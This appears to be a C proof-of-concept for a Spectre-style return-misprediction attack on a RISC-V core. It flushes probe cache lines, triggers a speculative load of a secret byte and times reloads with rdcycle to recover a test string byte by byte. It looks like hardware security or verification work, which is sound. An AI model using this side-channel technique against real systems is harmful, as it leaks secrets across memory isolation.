#include <stdio.h>
#include <stdint.h>

#include <klib.h>

#include "encoding.h"
#include "cache-utils.h"

#ifndef ATTACK_SAME_ROUNDS
#define ATTACK_SAME_ROUNDS 4
#endif
#ifndef SECRET_SZ
#define SECRET_SZ 6
#endif
#ifndef CACHE_HIT_THRESHOLD
#define CACHE_HIT_THRESHOLD 80
#endif
#ifndef USE_FIXED_CACHE_HIT_THRESHOLD
#define USE_FIXED_CACHE_HIT_THRESHOLD 1
#endif
#ifndef PROBE_CANDIDATES
#define PROBE_CANDIDATES 8
#endif
#ifndef EARLY_STOP
#define EARLY_STOP 1
#endif
#ifndef EARLY_STOP_MIN_SCORE
#define EARLY_STOP_MIN_SCORE 2
#endif
#ifndef EARLY_STOP_GAP
#define EARLY_STOP_GAP 1
#endif

static uint8_t attackArray[256 * L1_BLOCK_SZ_BYTES];
static char secretString[] = "V5Test";
static const char candidateTable[SECRET_SZ][PROBE_CANDIDATES + 1] = {
    "VWXYZ[\\]",
    "56789:;<",
    "TUVWXYZ[",
    "efghijkl",
    "stuvwxyz",
    "tuvwxyz{",
};

static void topTwoIdx(uint64_t *inArray, uint64_t inArraySize,
                      uint8_t *outIdxArray, uint64_t *outValArray)
{
  outValArray[0] = 0;
  outValArray[1] = 0;

  for (uint64_t i = 0; i < inArraySize; ++i) {
    if (inArray[i] > outValArray[0]) {
      outValArray[1] = outValArray[0];
      outValArray[0] = inArray[i];
      outIdxArray[1] = outIdxArray[0];
      outIdxArray[0] = i;
    } else if (inArray[i] > outValArray[1]) {
      outValArray[1] = inArray[i];
      outIdxArray[1] = i;
    }
  }
}

static inline uint8_t candidateProbeValue(uint64_t offset, uint64_t idx)
{
  return (uint8_t)candidateTable[offset][idx];
}

static inline void flushCacheLine(void *addr)
{
  asm volatile("cbo.flush 0(%0)" : : "r"(addr) : "memory");
}

static inline void fence_rw(void)
{
  asm volatile("fence rw, rw" : : : "memory");
}

static inline void flushProbeArray(uint64_t offset)
{
  for (uint64_t i = 0; i < PROBE_CANDIDATES; ++i) {
    uint64_t mixed_i = candidateProbeValue(offset, i);
    flushCacheLine(&attackArray[mixed_i * L1_BLOCK_SZ_BYTES]);
  }
  fence_rw();
}

static inline int enoughConfidence(uint64_t *results)
{
  uint8_t idx[2] = {0, 0};
  uint64_t score[2] = {0, 0};

  topTwoIdx(results, 256, idx, score);
  return score[0] >= EARLY_STOP_MIN_SCORE &&
         score[0] >= score[1] + EARLY_STOP_GAP;
}

uint8_t specFunc(uint64_t addr)
{
  extern void frameDump();
  uint64_t dummy = 0;
  frameDump();
  dummy = attackArray[(*((uint8_t *)addr)) * L1_BLOCK_SZ_BYTES];
  dummy = rdcycle();
  return (uint8_t)dummy;
}

int main(void)
{
  uint64_t start;
  uint64_t diff;
  uint8_t volatile dummy = 0;
  static uint64_t results[256];
  uint64_t threshold = CACHE_HIT_THRESHOLD;

#if USE_FIXED_CACHE_HIT_THRESHOLD
  threshold = CACHE_HIT_THRESHOLD;
#endif

  printf("[v5-tuned] reading %d bytes threshold=%lu candidates=%d same_rounds=%d per_byte_sets=1\n",
         SECRET_SZ, threshold, PROBE_CANDIDATES, ATTACK_SAME_ROUNDS);

  for (uint64_t offset = 0; offset < SECRET_SZ; ++offset) {
    for (uint64_t cIdx = 0; cIdx < 256; ++cIdx)
      results[cIdx] = 0;

    printf("[v5-tuned] byte-start index=%lu expected=0x%02x set=\"%s\"\n",
           offset, (uint8_t)secretString[offset], candidateTable[offset]);

    for (uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound) {
      flushProbeArray(offset);

      specFunc((uint64_t)secretString + offset);
      __asm__ volatile("ld fp, -16(sp)");

      for (uint64_t i = 0; i < PROBE_CANDIDATES; ++i) {
        uint64_t mixed_i = candidateProbeValue(offset, i);
        fence_rw();
        start = rdcycle();
        dummy &= attackArray[mixed_i * L1_BLOCK_SZ_BYTES];
        fence_rw();
        diff = rdcycle() - start;
        if (diff < threshold)
          results[mixed_i] += 1;
      }

      if (((atkRound + 1u) == 1u) || ((atkRound + 1u) == ATTACK_SAME_ROUNDS)) {
        uint8_t progress_idx[2] = {0, 0};
        uint64_t progress_score[2] = {0, 0};
        topTwoIdx(results, 256, progress_idx, progress_score);
        printf("[v5-tuned] byte=%lu round=%lu top1=%c(0x%02x):%lu top2=%c(0x%02x):%lu\n",
               offset, atkRound + 1u,
               (progress_idx[0] >= 32 && progress_idx[0] < 127) ? progress_idx[0] : '?',
               progress_idx[0], progress_score[0],
               (progress_idx[1] >= 32 && progress_idx[1] < 127) ? progress_idx[1] : '?',
               progress_idx[1], progress_score[1]);
      }

#if EARLY_STOP
      if (enoughConfidence(results)) {
        printf("[v5-tuned] early-stop byte=%lu round=%lu\n", offset, atkRound + 1u);
        break;
      }
#endif
    }

    uint8_t output[2] = {0, 0};
    uint64_t hitArray[2] = {0, 0};
    topTwoIdx(results, 256, output, hitArray);

    printf("m[0x%p] =?= guess(hits,dec,char) 1.(%lu, %d, %c) 2.(%lu, %d, %c)\n",
           (uint8_t *)(secretString + offset),
           hitArray[0], output[0], output[0],
           hitArray[1], output[1], output[1]);
  }

  (void)dummy;
  return 0;
}
